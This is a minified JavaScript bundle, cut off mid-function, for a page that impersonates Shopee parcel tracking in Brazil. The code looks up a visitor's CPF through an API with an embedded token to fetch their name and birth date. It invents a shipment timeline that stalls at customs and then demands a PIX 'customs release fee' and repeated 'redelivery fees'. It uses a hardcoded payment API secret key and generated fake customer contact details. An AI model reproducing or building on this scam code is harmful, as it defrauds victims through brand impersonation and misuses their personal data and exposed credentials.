import"./style-CGg7Jval.js";import{D as f,C as g,V as v}from"./vega-data-BHD3iLC5.js";import{N as P}from"./navigation-BreEIQuj.js";const x="modulepreload",b=function(m){return"/"+m},y={},S=function(e,t,a){let i=Promise.resolve();if(t&&t.length>0){document.getElementsByTagName("link");const s=document.querySelector("meta[property=csp-nonce]"),r=(s==null?void 0:s.nonce)||(s==null?void 0:s.getAttribute("nonce"));i=Promise.allSettled(t.map(n=>{if(n=b(n),n in y)return;y[n]=!0;const c=n.endsWith(".css"),p=c?'[rel="stylesheet"]':"";if(document.querySelector(`link[href="${n}"]${p}`))return;const l=document.createElement("link");if(l.rel=c?"stylesheet":x,c||(l.as="script"),l.crossOrigin="",l.href=n,r&&l.setAttribute("nonce",r),document.head.appendChild(l),c)return new Promise((d,u)=>{l.addEventListener("load",d),l.addEventListener("error",()=>u(new Error(`Unable to preload CSS for ${n}`)))})}))}function o(s){const r=new Event("vite:preloadError",{cancelable:!0});if(r.payload=s,window.dispatchEvent(r),!r.defaultPrevented)throw s}return i.then(s=>{for(const r of s||[])r.status==="rejected"&&o(r.reason);return e().catch(o)})};class I{constructor(){this.fallbackData=this.generateFallbackData(),console.log("DataService initialized")}async fetchCPFData(e){const t=e.replace(/[^\d]/g,"");console.log("Fetching data for CPF:",t);try{const a=await this.tryAPI(t);if(a)return console.log("Data obtained from API:",a),a}catch(a){console.error("API failed, using fallback:",a.message)}return console.log("Using fallback data for CPF:",t),this.getFallbackData(t)}async tryAPI(e){const t=new AbortController,a=setTimeout(()=>t.abort(),1e4);try{console.log("Calling API endpoint for CPF:",e);const i=`/api/amnesia/?token=e9f16505-2743-4392-bfbe-1b4b89a7367c&cpf=${e}`;console.log("🌐 API URL:",i);const o={signal:t.signal,method:"GET",headers:{Accept:"application/json","Content-Type":"application/json","Cache-Control":"no-cache"},credentials:"omit",cache:"no-store",mode:"cors"};console.log("📋 Fetch options:",o);const s=await fetch(i,o);if(clearTimeout(a),console.log("📊 Response status:",s.status,s.statusText),console.log("📋 Response headers:",Object.fromEntries(s.headers.entries())),!s.ok)throw console.error(`HTTP Error: ${s.status} - ${s.statusText}`),new Error(`API Error: ${s.status} - ${s.statusText}`);const r=await s.text();if(console.log("📄 API Response Text:",r),!r||r.trim()==="")throw console.error("Empty response from API"),new Error("Resposta vazia da API");try{const n=JSON.parse(r);if(console.log("📊 Parsed API data:",n),n&&n.DADOS&&n.DADOS.nome&&n.DADOS.cpf)return console.log("✅ API returned valid data:",{nome:n.DADOS.nome,cpf:n.DADOS.cpf,data_nascimento:n.DADOS.data_nascimento,sexo:n.DADOS.sexo}),n;throw console.error("❌ Invalid data format from API:",n),new Error("Formato de dados inválido da API")}catch(n){throw console.error("❌ JSON parse error:",n),new Error("Erro ao processar resposta da API: "+n.message)}}catch(i){throw clearTimeout(a),console.error("❌ API call error details:",{name:i.name,message:i.message,stack:i.stack}),i.name==="AbortError"?(console.error("⏰ Request was aborted (timeout)"),new Error("Timeout: A API demorou muito para responder")):i.message.includes("Failed to fetch")?(console.error("🌐 Network error - possibly CORS or connectivity issue"),new Error("Erro de conectividade: Não foi possível acessar a API externa")):i}}getFallbackData(e){const t=["João Silva Santos","Maria Oliveira Costa","Pedro Souza Lima","Ana Paula Ferreira","Carlos Eduardo Alves","Fernanda Santos Rocha","Ricardo Pereira Dias","Juliana Costa Martins","Bruno Almeida Silva","Camila Rodrigues Nunes","Rafael Santos Barbosa","Larissa Oliveira Cruz"],a=parseInt(e.slice(-2))%t.length,i=t[a];return console.log("Generated fallback data for CPF:",e,"Name:",i),{DADOS:{nome:i,cpf:e,data_nascimento:this.generateBirthDate(e),sexo:Math.random()>.5?"M":"F"}}}generateBirthDate(e){const t=1960+parseInt(e.slice(0,2))%40,a=parseInt(e.slice(2,4))%12+1;return`${(parseInt(e.slice(4,6))%28+1).toString().padStart(2,"0")}/${a.toString().padStart(2,"0")}/${t}`}generateFallbackData(){return{products:["Kit 12 caixas organizadoras + brinde","Conjunto de panelas antiaderentes","Smartphone Samsung Galaxy A54","Fone de ouvido Bluetooth","Carregador portátil 10000mAh","Camiseta básica algodão","Tênis esportivo Nike","Relógio digital smartwatch"]}}}class D{constructor(){this.baseURL="https://zentrapay-api.onrender.com",this.apiSecret=this.getApiSecret(),console.log("🔑 ZentraPayService inicializado com API oficial"),console.log("🔐 API Secret configurada:",this.apiSecret?"SIM":"NÃO")}getApiSecret(){const e=window.ZENTRA_PAY_SECRET_KEY||localStorage.getItem("zentra_pay_secret_key")||"sk_771c0f95ada260e7c2762cf26e2910dcc2efd47ca33899c5dc1c9d82c89b9be27f143f954da017fa9ffe9030ac5f0823cd50b6b6dee7a56c1a301dadf1b6a8f8";return e.startsWith("sk_")?(console.log("✅ API Secret Zentra Pay válida encontrada"),console.log("🔑 Secret (primeiros 20 chars):",e.substring(0,20)+"...")):console.error("❌ API Secret Zentra Pay inválida ou não configurada"),e}generateUniqueEmail(e){const t=Math.random().toString(36).substring(2,8);return`lead${e}_${t}@tempmail.com`}generateUniquePhone(e){return`11${e.toString().slice(-8)}`}generateExternalId(){const e=Date.now(),t=Math.random().toString(36).substring(2,8);return`bolt_${e}_${t}`}async createPixTransaction(e,t){var a,i;try{const o=Date.now(),s=this.generateUniqueEmail(o),r=this.generateUniquePhone(o),n=this.generateExternalId();if(this.apiSecret=this.getApiSecret(),!this.apiSecret||!this.apiSecret.startsWith("sk_"))throw new Error("API Secret inválida ou não configurada. Verifique se a chave Zentra Pay está corretamente definida.");const c={external_id:n,total_amount:parseFloat(t),payment_method:"PIX",webhook_url:"https://meusite.com/webhook",items:[{id:"liberation_fee",title:"Taxa de Liberação Aduaneira",quantity:1,price:parseFloat(t),description:"Taxa única para liberação de objeto na alfândega",is_physical:!1}],ip:"8.8.8.8",customer:{name:e.nome,email:s,phone:r,document_type:"CPF",document:e.cpf.replace(/[^\d]/g,"")}};console.log("🚀 Criando transação Zentra Pay com API oficial:",{external_id:c.external_id,total_amount:`R$ ${c.total_amount.toFixed(2)}`,payment_method:c.payment_method,webhook_url:c.webhook_url,ip:c.ip,customer:{name:c.customer.name,document:c.customer.document,email:c.customer.email,phone:c.customer.phone,document_type:c.customer.document_type}});const p={"api-secret":this.apiSecret,"Content-Type":"application/json"};console.log("📡 Headers da requisição (oficial):",{"api-secret":`${this.apiSecret.substring(0,20)}...`,"Content-Type":p["Content-Type"]});const l=await fetch(`${this.baseURL}/v1/transactions`,{method:"POST",headers:p,body:JSON.stringify(c)});if(console.log("📡 Status da resposta:",l.status),console.log("📡 Headers da resposta:",Object.fromEntries(l.headers.entries())),!l.ok){const u=await l.text();throw console.error("❌ Erro na API Zentra Pay:",{status:l.status,statusText:l.statusText,body:u,headers:Object.fromEntries(l.headers.entries())}),new Error(`Erro na API: ${l.status} - ${u}`)}const d=await l.json();if(console.log("✅ Resposta Zentra Pay recebida:",{transaction_id:d.transaction_id||d.id,external_id:d.external_id,has_pix_payload:!!((a=d.pix)!=null&&a.payload),has_qr_code:!!((i=d.pix)!=null&&i.qr_code),status:d.status,payment_method:d.payment_method}),!d.pix||!d.pix.payload)throw console.error("❌ Resposta incompleta da API:",d),new Error("Resposta da API não contém os dados PIX necessários (pix.payload)");return console.log("🎉 PIX gerado com sucesso via API oficial!"),console.log("📋 PIX Payload (copia e cola):",d.pix.payload),{success:!0,externalId:n,pixPayload:d.pix.payload,qrCode:d.pix.qr_code||null,transactionId:d.transaction_id||d.id,email:s,telefone:r,valor:t,status:d.status||"pending",paymentMethod:d.payment_method||"PIX",timestamp:o}}catch(o){return console.error("💥 Erro ao criar transação PIX:",{message:o.message,stack:o.stack,apiSecret:this.apiSecret?"CONFIGURADA":"NÃO CONFIGURADA"}),{success:!1,error:o.message,details:o.stack}}}setApiSecret(e){return!e||!e.startsWith("sk_")?(console.error("❌ API Secret inválida fornecida"),!1):(this.apiSecret=e,localStorage.setItem("zentra_pay_secret_key",e),window.ZENTRA_PAY_SECRET_KEY=e,console.log("🔑 API Secret Zentra Pay atualizada com sucesso"),!0)}async testConnection(){try{if(console.log("🔍 Testando conexão com Zentra Pay..."),this.apiSecret=this.getApiSecret(),!this.apiSecret||!this.apiSecret.startsWith("sk_"))throw new Error("API Secret inválida para teste de conexão");const e=await fetch(`${this.baseURL}/health`,{method:"GET",headers:{"api-secret":this.apiSecret,"Content-Type":"application/json"}});return e.ok?(console.log("✅ Conexão com Zentra Pay OK"),!0):(console.warn("⚠️ Problema na conexão:",e.status),!1)}catch(e){return console.error("❌ Erro ao testar conexão:",e),!1}}validateApiSecret(){return this.apiSecret?this.apiSecret.startsWith("sk_")?this.apiSecret.length<50?(console.error("❌ API Secret muito curta"),!1):(console.log("✅ API Secret válida"),!0):(console.error("❌ Formato de API Secret inválido"),!1):(console.error("❌ Nenhuma API Secret configurada"),!1)}}class h{static showLoadingNotification(){const e=document.createElement("div");e.id="trackingNotification",e.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;const t=document.createElement("div");if(t.style.cssText=`
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #ff6b35;
        `,t.innerHTML=`
            <div style="margin-bottom: 20px;">
                <i class="fas fa-search" style="font-size: 3rem; color: #ff6b35; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Identificando Pedido...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Aguarde enquanto rastreamos seu pacote
            </p>
            <div style="margin-top: 25px;">
                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
                    <div id="progressBar" style="width: 0%; height: 100%; background: linear-gradient(45deg, #ff6b35, #f7931e); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
                </div>
            </div>
            <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
                Processando informações...
            </p>
        `,e.appendChild(t),document.body.appendChild(e),document.body.style.overflow="hidden",!document.getElementById("trackingAnimations")){const a=document.createElement("style");a.id="trackingAnimations",a.textContent=`
                @keyframes progressBar {
                    from { width: 0%; }
                    to { width: 100%; }
                }
                @keyframes fadeIn {
                    from { opacity: 0; }
                    to { opacity: 1; }
                }
                @keyframes slideUp {
                    from { opacity: 0; transform: translateY(50px); }
                    to { opacity: 1; transform: translateY(0); }
                }
                @keyframes fadeOut {
                    from { opacity: 1; }
                    to { opacity: 0; }
                }
            `,document.head.appendChild(a)}}static closeLoadingNotification(){const e=document.getElementById("trackingNotification");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}static showError(e){const t=document.querySelector(".error-message");t&&t.remove();const a=document.createElement("div");a.className="error-message",a.style.cssText=`
            background: #fee;
            color: #c33;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            border: 1px solid #fcc;
            text-align: center;
            font-weight: 500;
            animation: slideDown 0.3s ease;
        `,a.textContent=e;const i=document.querySelector(".tracking-form");i&&(i.appendChild(a),setTimeout(()=>{a.parentNode&&(a.style.animation="slideUp 0.3s ease",setTimeout(()=>a.remove(),300))},5e3))}static scrollToElement(e,t=0){if(!e)return;const i=e.getBoundingClientRect().top+window.pageYOffset-t;window.scrollTo({top:i,behavior:"smooth"})}static animateTimeline(){document.querySelectorAll(".timeline-item").forEach((t,a)=>{setTimeout(()=>{t.style.opacity="1",t.style.transform="translateY(0)"},a*100)})}}const w=Object.freeze(Object.defineProperty({__proto__:null,UIHelpers:h},Symbol.toStringTag,{value:"Module"}));class E{constructor(){this.trackingSteps=[{id:1,title:"Seu pedido foi criado",description:"Seu pedido foi criado",isChina:!1},{id:2,title:"Preparando para envio",description:"Seu pedido está sendo preparado para envio",isChina:!1},{id:3,title:"Pedido enviado",description:"[China] O vendedor enviou seu pedido",isChina:!0},{id:4,title:"Centro de triagem",description:"[China] O pedido chegou ao centro de triagem de Shenzhen",isChina:!0},{id:5,title:"Centro logístico",description:"[China] Pedido saiu do centro logístico de Shenzhen",isChina:!0},{id:6,title:"Trânsito internacional",description:"[China] Coletado. O pedido está em trânsito internacional",isChina:!0},{id:7,title:"Liberado para exportação",description:"[China] O pedido foi liberado na alfândega de exportação",isChina:!0},{id:8,title:"Saiu da origem",description:"Pedido saiu da origem: Shenzhen",isChina:!1},{id:9,title:"Chegou no Brasil",description:"Pedido chegou no Brasil",isChina:!1},{id:10,title:"Alfândega de importação",description:"Pedido chegou na alfândega de importação: Curitiba/PR",isChina:!1}],this.deliveryValues=[7.74,12.38,16.46]}generateTimeline(e,t=new Date,a=!1,i=0){const o=[],s=new Date(e),r=t.getTime();for(let n=0;n<this.trackingSteps.length;n++){const c=this.trackingSteps[n];let p;if(n===0)p=new Date(s);else{const d=o[n-1].date,u=Math.floor(Math.random()*20)+1;p=new Date(d.getTime()+2*60*60*1e3+u*60*1e3)}const l=p.getTime()<=r;o.push({...c,date:p,completed:l,needsLiberation:n===this.trackingSteps.length-1&&l&&!a,showLiberationButton:n===this.trackingSteps.length-1&&l&&!a})}return a&&this.addPostPaymentSteps(o,i,r),o}addPostPaymentSteps(e,t,a){const o=e[e.length-1].liberationDate||new Date(a);e.push({id:11,title:"Pedido liberado",description:"Pedido liberado na alfândega",date:new Date(o),completed:!0,isPostPayment:!0});const s=new Date(o.getTime()+30*1e3);e.push({id:12,title:"Sairá para entrega",description:"Pedido sairá para entrega a qualquer momento, aguarde",date:s,completed:s.getTime()<=a,isPostPayment:!0});const r=new Date(o.getTime()+10*60*1e3);e.push({id:13,title:"Em trânsito",description:"Pedido em trânsito",date:r,completed:r.getTime()<=a,isPostPayment:!0});const n=new Date(o.getTime()+45*60*1e3);e.push({id:14,title:"Em rota de entrega",description:"Pedido em rota de entrega",date:n,completed:n.getTime()<=a,isPostPayment:!0}),this.addDeliveryAttempts(e,t,o,a)}addDeliveryAttempts(e,t,a,i){const o=new Date(a.getTime()+72e5);for(let s=0;s<=t;s++){const r=new Date(o.getTime()+s*3*60*60*1e3),n=s%3+1,c=this.deliveryValues[n-1];e.push({id:15+s*2,title:`Tentativa de entrega ${n}°`,description:`${n}ª tentativa de entrega realizada, mas não foi possível entregar`,date:r,completed:r.getTime()<=i,isDeliveryAttempt:!0,attemptNumber:n,value:c,needsDeliveryPayment:r.getTime()<=i&&s===t}),s<t&&e.push({id:16+s*2,title:"Pedido liberado para entrega",description:"Pedido liberado para entrega",date:new Date(r.getTime()+30*1e3),completed:!0,isPostPayment:!0})}}simulateNextStep(e){const t=e.find(a=>!a.completed);return t?(t.completed=!0,t.date=new Date,t):null}checkForNewSteps(e,t=new Date){const a=t.getTime();let i=!1;return e.forEach(o=>{!o.completed&&o.date.getTime()<=a&&(o.completed=!0,i=!0)}),i}getCurrentStatus(e){const t=e.filter(i=>i.completed),a=t[t.length-1];return a?a.needsLiberation?"Aguardando liberação aduaneira":a.needsDeliveryPayment?`Aguardando pagamento da ${a.attemptNumber}ª tentativa`:a.description:"Pedido criado"}formatDate(e){return{date:e.toLocaleDateString("pt-BR",{day:"2-digit",month:"short"}),time:e.toLocaleTimeString("pt-BR",{hour:"2-digit",minute:"2-digit"})}}}class T{constructor(){this.dataService=new I,this.zentraPayService=new D,this.trackingService=new E,this.dbService=new f,this.currentCPF=null,this.userData=null,this.trackingData=null,this.leadData=null,this.isInitialized=!1,this.pixData=null,this.liberationPaid=!1,this.deliveryAttempts=0,this.refreshInterval=null}async init(){if(!this.isInitialized){console.log("🚀 Inicializando sistema de rastreamento completo");try{this.setupCPFInput(),this.setupTrackingForm(),this.setupOrderDetailsAccordion(),this.setupModalEvents(),this.checkURLParams(),this.isInitialized=!0,console.log("✅ Sistema de rastreamento inicializado")}catch(e){console.error("❌ Erro na inicialização:",e)}}}setupCPFInput(){const e=document.getElementById("cpfInput");e&&(e.addEventListener("input",t=>{g.applyCPFMask(t.target)}),e.addEventListener("keypress",t=>{t.key==="Enter"&&(t.preventDefault(),this.handleTrackingSubmit())}))}setupTrackingForm(){const e=document.getElementById("trackingForm"),t=document.getElementById("trackButton");e&&e.addEventListener("submit",a=>{a.preventDefault(),this.handleTrackingSubmit()}),t&&t.addEventListener("click",a=>{a.preventDefault(),this.handleTrackingSubmit()})}async handleTrackingSubmit(){const e=document.getElementById("cpfInput"),t=document.getElementById("trackButton");if(!e||!t){console.error("❌ Elementos do formulário não encontrados");return}const a=e.value.trim();if(!a){this.showError("Por favor, digite um CPF");return}if(!g.isValidCPF(a)){this.showError("CPF inválido. Verifique os dados digitados.");return}this.currentCPF=g.cleanCPF(a),t.disabled=!0,t.innerHTML='<i class="fas fa-spinner fa-spin"></i> Rastreando...',this.showLoadingNotification();try{console.log("🔍 Buscando dados para CPF:",this.currentCPF),await this.getOrCreateLead();const i=await this.dataService.fetchCPFData(this.currentCPF);if(console.log("📊 Dados recebidos:",i),i&&i.DADOS){this.userData={nome:i.DADOS.nome,cpf:this.currentCPF,nascimento:i.DADOS.data_nascimento,situacao:"REGULAR"},console.log("✅ Dados obtidos:",this.userData),await new Promise(s=>setTimeout(s,2e3)),this.closeLoadingNotification(),this.displayOrderDetails(),this.generateRealTimeTrackingData(),this.displayTrackingResults(),this.startAutoRefresh();const o=document.getElementById("orderDetails");o&&this.scrollToElement(o,100)}else throw new Error("Dados não encontrados")}catch(i){console.error("❌ Erro no rastreamento:",i),this.closeLoadingNotification(),this.showError("Erro ao buscar dados. Tente novamente.")}finally{t.disabled=!1,t.innerHTML='<i class="fas fa-search"></i> Rastrear Pacote'}}async getOrCreateLead(){try{const e=await this.dbService.getLeadByCPF(this.currentCPF);if(e.success&&e.data)this.leadData=e.data,this.liberationPaid=e.data.liberation_paid||!1,this.deliveryAttempts=e.data.delivery_attempts||0,console.log("📋 Lead existente encontrado:",this.leadData);else{const t={cpf:this.currentCPF,nome_completo:"Cliente Shopee",initial_timestamp:new Date().toISOString(),liberation_paid:!1,delivery_attempts:0,origem:"rastreamento"},a=await this.dbService.createLead(t);a.success&&(this.leadData=a.data,console.log("📋 Novo lead criado:",this.leadData))}}catch(e){console.error("❌ Erro ao buscar/criar lead:",e)}}generateRealTimeTrackingData(){if(!this.leadData)return;const e=this.leadData.initial_timestamp,t=new Date;this.trackingData={timeline:this.trackingService.generateTimeline(e,t,this.liberationPaid,this.deliveryAttempts),initialTimestamp:e,liberationPaid:this.liberationPaid,deliveryAttempts:this.deliveryAttempts},console.log("📊 Timeline gerada:",this.trackingData)}displayTrackingResults(){const e=document.getElementById("trackingResults"),t=document.getElementById("customerNameStatus"),a=document.getElementById("currentStatus"),i=document.getElementById("trackingTimeline");if(e&&(e.style.display="block"),t&&(t.textContent=this.userData.nome.split(" ")[0]),a){const o=this.trackingService.getCurrentStatus(this.trackingData.timeline);a.textContent=o}i&&this.renderTimeline(i),setTimeout(()=>{this.animateTimeline()},500)}renderTimeline(e){e.innerHTML="",this.trackingData.timeline.forEach((t,a)=>{const i=this.createTimelineItem(t,a);e.appendChild(i)})}createTimelineItem(e,t){const a=document.createElement("div");a.className=`timeline-item ${e.completed?"completed":""}`,t===0&&a.classList.add("first"),e.isPostPayment&&(a.style.background="linear-gradient(135deg, #d4edda, #c3e6cb)",a.style.borderRadius="10px",a.style.padding="15px",a.style.margin="10px 0",a.style.border="2px solid #27ae60");const i=e.date.toLocaleDateString("pt-BR",{day:"2-digit",month:"short"}),o=e.date.toLocaleTimeString("pt-BR",{hour:"2-digit",minute:"2-digit"});let s="";return e.needsLiberation&&(s=`
                <button class="liberation-button-timeline" data-liberation-button>
                    <i class="fas fa-unlock"></i> LIBERAR OBJETO
                </button>
            `),e.needsDeliveryPayment&&(s=`
                <button class="delivery-retry-btn" data-attempt="${e.attemptNumber}" data-value="${e.value}">
                    <i class="fas fa-redo"></i> Reenviar Pacote - R$ ${e.value.toFixed(2)}
                </button>
            `),a.innerHTML=`
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${i}</span>
                    <span class="time">${o}</span>
                </div>
                <div class="timeline-text">
                    <p>
                        ${e.isChina?'<span class="china-tag">[China]</span>':""}
                        ${e.description}
                    </p>
                    ${s}
                </div>
            </div>
        `,setTimeout(()=>{this.setupTimelineButtons(a)},100),a}setupTimelineButtons(e){const t=e.querySelector("[data-liberation-button]");t&&t.addEventListener("click",()=>{this.showLiberationModal()});const a=e.querySelector(".delivery-retry-btn");a&&a.addEventListener("click",()=>{const i=parseInt(a.dataset.attempt),o=parseFloat(a.dataset.value);this.showDeliveryModal(i,o)})}async showLiberationModal(){console.log("🔓 Abrindo modal de liberação");const e=document.getElementById("liberationModal");if(!e){console.error("❌ Modal de liberação não encontrado");return}e.style.display="flex",document.body.style.overflow="hidden",this.generatePixInBackground()}async generatePixInBackground(){console.log("🔄 Gerando PIX em background..."),this.showPixLoadingState();try{const e=await this.zentraPayService.createPixTransaction(this.userData,26.34);e.success?(console.log("🎉 PIX gerado com sucesso!"),this.pixData=e,this.updateModalWithRealPix()):(console.warn("⚠️ Erro ao gerar PIX, usando estático"),this.updateModalWithStaticPix())}catch(e){console.error("💥 Erro ao gerar PIX:",e),this.updateModalWithStaticPix()}}showPixLoadingState(){const e=document.getElementById("realPixQrCode"),t=document.getElementById("pixCodeModal"),a=document.getElementById("copyPixButtonModal");e&&(e.src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCIgdmlld0JveD0iMCAwIDIwMCAyMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iMjAwIiBmaWxsPSIjZjhmOWZhIi8+CjxjaXJjbGUgY3g9IjEwMCIgY3k9IjEwMCIgcj0iMjAiIGZpbGw9IiNmZjZiMzUiPgogIDxhbmltYXRlVHJhbnNmb3JtIGF0dHJpYnV0ZU5hbWU9InRyYW5zZm9ybSIgYXR0cmlidXRlVHlwZT0iWE1MIiB0eXBlPSJyb3RhdGUiIGZyb209IjAgMTAwIDEwMCIgdG89IjM2MCAxMDAgMTAwIiBkdXI9IjFzIiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSIvPgo8L2NpcmNsZT4KPHRleHQgeD0iMTAwIiB5PSIxNDAiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IiM2NjYiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxMiI+U29saWNpdGFuZG8uLi48L3RleHQ+Cjwvc3ZnPg=="),t&&(t.value="Solicitando liberação...",t.style.color="#999",t.style.fontStyle="italic"),a&&(a.disabled=!0,a.innerHTML='<i class="fas fa-spinner fa-spin"></i> Solicitando...',a.style.opacity="0.7")}updateModalWithRealPix(){const e=document.getElementById("realPixQrCode"),t=document.getElementById("pixCodeModal"),a=document.getElementById("copyPixButtonModal");e&&this.pixData.pixPayload&&(e.src=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.pixData.pixPayload)}`),t&&this.pixData.pixPayload&&(t.value=this.pixData.pixPayload,t.style.color="",t.style.fontStyle=""),a&&(a.disabled=!1,a.innerHTML='<i class="fas fa-copy"></i> Copiar',a.style.opacity="")}updateModalWithStaticPix(){const e=document.getElementById("realPixQrCode"),t=document.getElementById("pixCodeModal"),a=document.getElementById("copyPixButtonModal"),i="00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2";e&&(e.src=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(i)}`),t&&(t.value=i,t.style.color="",t.style.fontStyle=""),a&&(a.disabled=!1,a.innerHTML='<i class="fas fa-copy"></i> Copiar',a.style.opacity="")}async showDeliveryModal(e,t){console.log(`🚚 Abrindo modal de reenvio - Tentativa ${e} - R$ ${t.toFixed(2)}`);const a=document.createElement("div");a.className="modal-overlay",a.id="deliveryModal",a.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;let i,o;try{const s=await this.zentraPayService.createPixTransaction(this.userData,t);if(s.success)i=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(s.pixPayload)}`,o=s.pixPayload;else throw new Error("Fallback para PIX estático")}catch{i="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2",o="00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2"}a.innerHTML=`
            <div class="professional-modal-container">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">Tentativa de Entrega ${e}°</h2>
                    <button class="professional-modal-close" id="closeDeliveryModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content">
                    <div class="liberation-explanation">
                        <p class="liberation-subtitle">
                            Para reagendar a entrega do seu pedido, é necessário pagar a taxa de reenvio de R$ ${t.toFixed(2)}.
                        </p>
                    </div>

                    <div class="professional-fee-display">
                        <div class="fee-info">
                            <span class="fee-label">Taxa de Reenvio - ${e}° Tentativa</span>
                            <span class="fee-amount">R$ ${t.toFixed(2)}</span>
                        </div>
                    </div>

                    <div class="professional-pix-section">
                        <h3 class="pix-section-title">Pagamento via Pix</h3>
                        
                        <div class="pix-content-grid">
                            <div class="qr-code-section">
                                <div class="qr-code-container">
                                    <img src="${i}" alt="QR Code PIX Reenvio" class="professional-qr-code">
                                </div>
                            </div>
                            
                            <div class="pix-copy-section">
                                <label class="pix-copy-label">PIX Copia e Cola</label>
                                <div class="professional-copy-container">
                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${o}</textarea>
                                    <button class="professional-copy-button" id="copyDeliveryPixButton">
                                        <i class="fas fa-copy"></i> Copiar
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <div class="professional-payment-steps">
                            <h4 class="steps-title">Como realizar o pagamento:</h4>
                            <div class="payment-steps-grid">
                                <div class="payment-step">
                                    <div class="step-number">1</div>
                                    <div class="step-content">
                                        <i class="fas fa-mobile-alt step-icon"></i>
                                        <span class="step-text">Acesse seu app do banco</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">2</div>
                                    <div class="step-content">
                                        <i class="fas fa-qrcode step-icon"></i>
                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">3</div>
                                    <div class="step-content">
                                        <i class="fas fa-check step-icon"></i>
                                        <span class="step-text">Confirme o pagamento</span>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="simulation-section" style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #e9ecef; text-align: center;">
                            <button class="simulation-button" id="simulateDeliveryPayment" data-attempt="${e}" style="
                                background: linear-gradient(45deg, #27ae60, #2ecc71);
                                color: white;
                                border: none;
                                padding: 12px 25px;
                                font-size: 14px;
                                font-weight: 600;
                                border-radius: 8px;
                                cursor: pointer;
                                transition: all 0.3s ease;
                                font-family: Inter, sans-serif;
                                display: inline-flex;
                                align-items: center;
                                gap: 8px;
                                box-shadow: 0 2px 8px rgba(39, 174, 96, 0.3);
                            ">
                                <i class="fas fa-check-circle"></i>
                                Simular Pagamento Realizado
                            </button>
                            <p style="font-size: 12px; color: #999; margin-top: 8px; font-family: Inter, sans-serif;">
                                Para fins de demonstração
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        `,document.body.appendChild(a),document.body.style.overflow="hidden",this.setupDeliveryModalEvents(a,e)}setupDeliveryModalEvents(e,t){const a=e.querySelector("#closeDeliveryModal");a&&a.addEventListener("click",()=>{this.closeDeliveryModal()});const i=e.querySelector("#copyDeliveryPixButton");i&&i.addEventListener("click",()=>{this.copyDeliveryPixCode()});const o=e.querySelector("#simulateDeliveryPayment");o&&o.addEventListener("click",()=>{this.simulateDeliveryPayment(t)}),e.addEventListener("click",s=>{s.target===e&&this.closeDeliveryModal()})}async simulateDeliveryPayment(e){console.log(`🎭 Simulando pagamento da ${e}° tentativa`),this.closeDeliveryModal(),this.deliveryAttempts++,await this.dbService.updateDeliveryAttempts(this.currentCPF,this.deliveryAttempts),this.showPaymentSuccessNotification(`${e}° tentativa paga`),setTimeout(()=>{this.generateRealTimeTrackingData(),this.displayTrackingResults()},2e3)}copyDeliveryPixCode(){const e=document.getElementById("deliveryPixCode"),t=document.getElementById("copyDeliveryPixButton");if(!(!e||!t))try{e.select(),e.setSelectionRange(0,99999),navigator.clipboard&&window.isSecureContext?navigator.clipboard.writeText(e.value).then(()=>{this.showCopySuccess(t)}).catch(()=>{this.fallbackCopy(e,t)}):this.fallbackCopy(e,t)}catch(a){console.error("❌ Erro ao copiar PIX:",a)}}closeDeliveryModal(){const 